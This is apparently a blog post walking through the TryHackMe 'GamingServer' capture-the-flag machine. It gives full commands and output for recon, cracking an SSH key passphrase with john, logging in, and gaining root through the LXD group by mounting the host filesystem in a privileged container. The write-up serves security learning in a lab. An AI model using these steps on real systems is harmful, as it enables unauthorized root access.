-&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.100.235’. I start by doing an nmap scan to check what ports are open.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #nmap -sC -sV -oA nmap/initial 10.10.100.235
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 14:40 BST
-Nmap scan report for 10.10.100.235
-Host is up (0.026s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
-|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
-|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: House of danak
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Two ports, 22 and 80. I will look at port 80 first.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;Port 80 brings us to a simple web page, while I look around the website I started a Gobuster in the background.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #gobuster dir -u http://10.10.100.235 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.100.235
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/09/06 14:45:50 Starting gobuster
-===============================================================
-/uploads (Status: 301)
-/secret (Status: 301)
-/server-status (Status: 403)
-===============================================================
-2020/09/06 14:48:03 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Looking at the source I do see a comment aimed at someone called ‘john’, could be a possible username.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;john, please add some actual content to the site! lorem ipsum is horrible to look at.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/source.png&quot; alt=&quot;source&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;On the DRAAGAN LORE page is a link to ‘uploads’ which redirects to a directory.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/draaganlore.png&quot; alt=&quot;draaganlore&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The directory contains 3 files.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/uploads.png&quot; alt=&quot;uploads&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Using wget I downloaded each one.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #wget http://10.10.100.235/uploads/dict.lst
---2020-09-06 14:50:33--  http://10.10.100.235/uploads/dict.lst
-Connecting to 10.10.100.235:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 2006 (2.0K)
-Saving to: ‘dict.lst’
-
-dict.lst                              100%[========================================================================&amp;gt;]   1.96K  --.-KB/s    in 0s   
-
-2020-09-06 14:50:33 (229 MB/s) - ‘dict.lst’ saved [2006/2006]
-
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #wget http://10.10.100.235/uploads/manifesto.txt
---2020-09-06 14:50:52--  http://10.10.100.235/uploads/manifesto.txt
-Connecting to 10.10.100.235:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3070 (3.0K) [text/plain]
-Saving to: ‘manifesto.txt’
-
-manifesto.txt                         100%[========================================================================&amp;gt;]   3.00K  --.-KB/s    in 0s   
-
-2020-09-06 14:50:52 (530 MB/s) - ‘manifesto.txt’ saved [3070/3070]
-
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #wget http://10.10.100.235/uploads/meme.jpg
---2020-09-06 14:51:09--  http://10.10.100.235/uploads/meme.jpg
-Connecting to 10.10.100.235:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 15457 (15K) [image/jpeg]
-Saving to: ‘meme.jpg’
-
-meme.jpg                              100%[========================================================================&amp;gt;]  15.09K  --.-KB/s    in 0.02s
-
-2020-09-06 14:51:09 (679 KB/s) - ‘meme.jpg’ saved [15457/15457]
-
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Looking at each file:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;dict.lst - Appears to be a list of passwords&lt;/li&gt;
-  &lt;li&gt;manifesto.txt - Is a copy of ‘The Hacker Manifesto’ by The Mentor from January 8 1986&lt;/li&gt;
-  &lt;li&gt;meme.jpg - Is an image of a muppet&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The dict.lst could be useful, looking back at the Gobuster output is a /secret directory.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/gamingserver/secret.png&quot; alt=&quot;secret&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Inside is a SecretKey. Again I will download with wget.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]                                                                                     
-└──╼ #wget http://10.10.100.235/secret/secretKey                                                                                                 
---2020-09-06 14:50:07--  http://10.10.100.235/secret/secretKey                                                                                   
-Connecting to 10.10.100.235:80... connected.                                                                                                     
-HTTP request sent, awaiting response... 200 OK                                                                                                   
-Length: 1766 (1.7K)                                                                                                                              
-Saving to: ‘secretKey’                                                                                                                           
-                                                                                                                                                 
-secretKey                             100%[========================================================================&amp;gt;]   1.72K  --.-KB/s    in 0s 
-                                                                                                                                                 
-2020-09-06 14:52:07 (223 MB/s) - ‘secretKey’ saved [1766/1766]   
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Great it looks like a encrypted SSH id_rsa key, lets use the password list from the upload folder to crack.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #cat secretKey 
------BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
-
-T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
-H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
-FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
-Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
-9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
-IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
-SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
-/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
-w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
-6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
-Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
-xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
-8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
-b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
-&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I used the ssh2john Python script to extract the password hash from the key file.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #/usr/share/john/ssh2john.py secretKey &amp;gt; cracked
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #cat cracked 
-secretKey:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f
-298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7
-f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a3
-1114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfd
-f09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f
-2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a8
-6b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7
-c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c37
-88baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af13167
-1def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45
-&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now with the hash I can use john to crack.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #john cracked -w dict.lst 
-Warning: only loading hashes of type &quot;SSH&quot;, but also saw type &quot;tripcode&quot;
-Use the &quot;--format=tripcode&quot; option to force loading hashes of that type instead
-Using default input encoding: UTF-8
-Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
-Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
-Cost 2 (iteration count) is 1 for all loaded hashes
-Will run 2 OpenMP threads
-Note: This format may emit false positives, so it will keep trying even after
-finding a possible candidate.
-Press 'q' or Ctrl-C to abort, almost any other key for status
-          (secretKey)
-1g 0:00:00:00 DONE (2020-09-06 15:20) 100.0g/s 354600p/s 354600c/s 354600C/s 1701d..sss
-Session completed
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It doesn’t take long to crack. Using the key and password I should be able to SSH in to the machine. However, I dont know the username, going back to the HTML comment earlier, I will try with the username ‘john’. First I need to chmod 600 the key file before I can use it.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #chmod 600 secretKey 
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #ssh -i secretKey john@10.10.100.235
-The authenticity of host '10.10.100.235 (10.10.100.235)' can't be established.
-ECDSA key fingerprint is SHA256:LO5bYqjXqLnB39jxUzFMiOaZ1YnyFGGXUmf1edL6R9o.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.100.235' (ECDSA) to the list of known hosts.
-Enter passphrase for key 'secretKey': 
-Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun Sep  6 14:23:42 UTC 2020
-
-  System load:  0.0               Processes:           96
-  Usage of /:   41.3% of 9.78GB   Users logged in:     0
-  Memory usage: 40%               IP address for eth0: 10.10.100.235
-  Swap usage:   0%
-
-
-0 packages can be updated.
-0 updates are security updates.
-
-
-Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
-john@exploitable:~$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Im in! Lets grab the first flag.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ ls
-user.txt
-john@exploitable:~$ cat user.txt
-a5c2ff8b9c2e
-john@exploitable:~$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;
-
-&lt;p&gt;Now on to the root flag. Doing the command ‘id’ shows John is part of many groups including ‘sudo’ and ‘lxd’. I tried ‘sudo -l’ but as I don’t have John’s password I cant run any commands as sudo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ id
-uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
-john@exploitable:~$ sudo -l
-[sudo] password for john: 
-Sorry, try again.
-[sudo] password for john: 
-Sorry, try again.
-[sudo] password for john: 
-sudo: 3 incorrect password attempts
-john@exploitable:~$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However, lxd is interesting. LXD is a Linux container system. Googling ‘lxd privesc’ led me to an &lt;a href=&quot;https://www.hackingarticles.in/lxd-privilege-escalation/&quot;&gt;article&lt;/a&gt; with a overview of LXD, LXC and container technology. Also a step my step guide on how to use LXD to gain root privilege to the host machine.&lt;/p&gt;
-
-&lt;p&gt;First I use git clone to download the alpine builder. Once downloaded I ran the build script.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[✗]─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #git clone  https://github.com/saghul/lxd-alpine-builder.git
-Cloning into 'lxd-alpine-builder'...
-remote: Enumerating objects: 27, done.
-remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
-Receiving objects: 100% (27/27), 16.00 KiB | 199.00 KiB/s, done.
-Resolving deltas: 100% (6/6), done.
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
-└──╼ #cd lxd-alpine-builder
-┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
-└──╼ #sudo ./build-alpine
-Determining the latest release... v3.12
-Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
-Downloading alpine-mirrors-3.5.10-r0.apk
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-Downloading alpine-keys-2.2-r0.apk
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-Downloading apk-tools-static-2.10.5-r1.apk
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
-alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
-Verified OK
-Selecting mirror http://mirror1.hs-esslingen.de/pub/Mirrors/alpine/v3.12/main
-fetch http://mirror1.hs-esslingen.de/pub/Mirrors/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
-(1/19) Installing musl (1.1.24-r9)
-(2/19) Installing busybox (1.31.1-r19)
-Executing busybox-1.31.1-r19.post-install
-(3/19) Installing alpine-baselayout (3.2.0-r7)
-Executing alpine-baselayout-3.2.0-r7.pre-install
-Executing alpine-baselayout-3.2.0-r7.post-install
-(4/19) Installing openrc (0.42.1-r11)
-Executing openrc-0.42.1-r11.post-install
-(5/19) Installing alpine-conf (3.9.0-r1)
-(6/19) Installing libcrypto1.1 (1.1.1g-r0)
-(7/19) Installing libssl1.1 (1.1.1g-r0)
-(8/19) Installing ca-certificates-bundle (20191127-r4)
-(9/19) Installing libtls-standalone (2.9.1-r1)
-(10/19) Installing ssl_client (1.31.1-r19)
-(11/19) Installing zlib (1.2.11-r3)
-(12/19) Installing apk-tools (2.10.5-r1)
-(13/19) Installing busybox-suid (1.31.1-r19)
-(14/19) Installing busybox-initscripts (3.2-r2)
-Executing busybox-initscripts-3.2-r2.post-install
-(15/19) Installing scanelf (1.2.6-r0)
-(16/19) Installing musl-utils (1.1.24-r9)
-(17/19) Installing libc-utils (0.7.2-r3)
-(18/19) Installing alpine-keys (2.2-r0)
-(19/19) Installing alpine-base (3.12.0-r0)
-Executing busybox-1.31.1-r19.trigger
-OK: 8 MiB in 19 packages
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I now have a .tar.gz file I can copy on to the victim machine.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
-└──╼ #ls
-alpine-v3.12-x86_64-20200906_1552.tar.gz  build-alpine  LICENSE  README.md
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Using Python3 I started a http server.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
-└──╼ #python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Back on the victim machine, I use wget to download the file.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:~$ cd /tmp
-john@exploitable:/tmp$ wget http://10.8.21.217/alpine-v3.12-x86_64-20200906_1552.tar.gz
---2020-09-06 14:55:47--  http://10.8.21.217/alpine-v3.12-x86_64-20200906_1552.tar.gz
-Connecting to 10.8.21.217:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 3109382 (3.0M) [application/gzip]
-Saving to: ‘alpine-v3.12-x86_64-20200906_1552.tar.gz’
-
-alpine-v3.12-x86_64-20200906_1552.tar 100%[========================================================================&amp;gt;]   2.96M  1.01MB/s    in 2.9s
-
-2020-09-06 14:55:50 (1.01 MB/s) - ‘alpine-v3.12-x86_64-20200906_1552.tar.gz’ saved [3109382/3109382]
-
-john@exploitable:/tmp$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Still following the steps from the article, I import the image and run, mounting the root file system.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200906_1552.tar.gz --alias myimage
-Image imported with fingerprint: 4397c7dce96e22e14f6c108eebaeb629f21273dd5a7791754ad0a082c026b09c
-john@exploitable:/tmp$ lxc image list
-+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
-|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
-+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
-| myimage | 4397c7dce96e | no     | alpine v3.12 (20200906_15:52) | x86_64 | 2.97MB | Sep 6, 2020 at 2:56pm (UTC) |
-+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
-john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
-Creating ignite
-john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
-Device mydevice added to ignite
-john@exploitable:/tmp$ lxc start ignite
-john@exploitable:/tmp$ lxc exec ignite /bin/sh
-id~ # id
-uid=0(root) gid=0(root)
-~ # cd /mnt/root/root/
-/mnt/root/root # ls
-root.txt
-/mnt/root/root # cat root.txt 
-2e337b8c9f3a
-/mnt/root/root # 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We have the root flag! Thank you for reading.&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="oscp" />
       
 
       
